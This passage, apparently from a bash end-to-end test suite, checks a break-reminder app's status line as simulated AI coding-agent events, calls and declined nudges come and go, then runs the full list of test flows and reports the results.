  dbg timers 1250 3050
  expect "due" "$(line)" "stretch due"
  expect "--color: due in the app's mint" "$(bp status --line --color | grep -cE $'^\e\\[38;(2;61;214;176|5;79)mstretch due')" "1"
  emit agentStarted --source claude-code --session s1 --cwd /work/alpha
  expect "the nudge's own title, and the agent" "$(line)" "2-min stretch? · Claude working"
  dbg action accept
  dbg advance 30
  expect "on a stretch: time left" "$(line)" "stretch 1:30 left · Claude working"
  emit agentNeedsUser --source claude-code --session s1 --detail permission_prompt
  expect "needs you during the break" "$(line)" "stretch 1:30 left · Claude needs you"
  dbg advance 91
  expect "break over, still needs you" "$(line)" "eye rest in 20 min · Claude needs you"
  emit agentActivity --source claude-code --session s1
  emit agentStarted --source codex --session c1 --cwd /work/beta
  dbg advance 120
  emit agentNeedsUser --source codex --session c1 --detail permission_prompt
  expect "two agents: counted, needs you first" "$(line)" "eye rest in 18 min · 1 needs you · 1 working"
  dbg call mic
  expect "a microphone just on is not a call yet: no pause, as on the menu bar" "$(line) | $(q .menuBar.mark)" "eye rest in 18 min · 1 needs you · 1 working | idle"
  dbg advance 60
  expect "a minute on: paused by a call" "$(line)" "paused: microphone is on · 1 needs you · 1 working"
  dbg call none
  emit agentFinished --source claude-code --session s1
  emit agentFinished --source codex --session c1
  dbg advance 61
  # Three noes in a row: the stretch waits a cadence, yet it is due, as the menu bar shows it.
  dbg settings '{"strictAgentOnly": true}'
  dbg advance 600                                       # past the spacing after the last nudge
  prompt() { emit agentFinished --source claude-code --session s9; emit agentStarted --source claude-code --session s9; }
  dbg timers 0 3050
  prompt
  dbg action decline
  dbg advance 601
  dbg timers 0 3700
  prompt
  dbg action decline
  dbg advance 601
  dbg timers 0 4300
  prompt
  expect "after two noes, the breather" "$(q .nudge.kind)" "breathe"
  dbg action decline
  dbg advance 601
  dbg timers 0 4900
  prompt
  expect "the third no: nothing offered ten minutes on" "$(q .nudge)" "null"
  expect "the stretch is still due, in the line as on the menu bar" "$(line) | $(q .menuBar.mark)" "stretch due · Claude working | due"
  dbg input mirrored on
  expect "presenting: the same" "$(line) | $(q .menuBar.mark)" "stretch due · Claude working | due"
  dbg input mirrored off
  dbg call mic
  prompt
  expect "a microphone holding offers: the same" "$(line) | $(q .menuBar.mark)" "stretch due · Claude working | due"
  dbg call none
  emit agentFinished --source claude-code --session s9
  dbg settings '{"strictAgentOnly": false}'
  dbg action start breathe
  dbg advance 61
  dbg timers 300 3100
  expect "after a breather the stretch is held: the eye rest comes next" "$(line)" "eye rest in 15 min"
  expect "piped: no colour" "$(line | grep -c $'\e')" "0"
  expect "the full report is unchanged" "$(bp status | jq -r '.nextBreak.kind')" "eyes"
  stop_app
  expect "app not running: nothing" "$(line)" ""
  expect "app not running: exit 0" "$(line; echo $?)" "0"
  end_flow
}

ALL=(launch_and_onboarding tour hints_after_tour hints_after_skipped_tour hints_existing_user popover sessions offers breaks walk walk_ended_early counted saying_no away resume_keeps_needs_you calls presenting dictation commands wind_down settings cursor_relay
     malformed integrations delete_all second_copy occupied_socket signals
     resume_outcome resume_background resume_needs_you_goes resume_commands totals charm updates
     update_install update_reopened update_automatic install_script routines pacing status_line)
for name in "${ALL[@]}"; do
  wanted "$name" && "flow_$name"
done

echo
echo "e2e: $PASSED passed, $FAILED failed"
if [[ $FAILED -gt 0 ]]; then
  printf '  %s\n' "${FAILED_NAMES[@]}"
  exit 1
fi
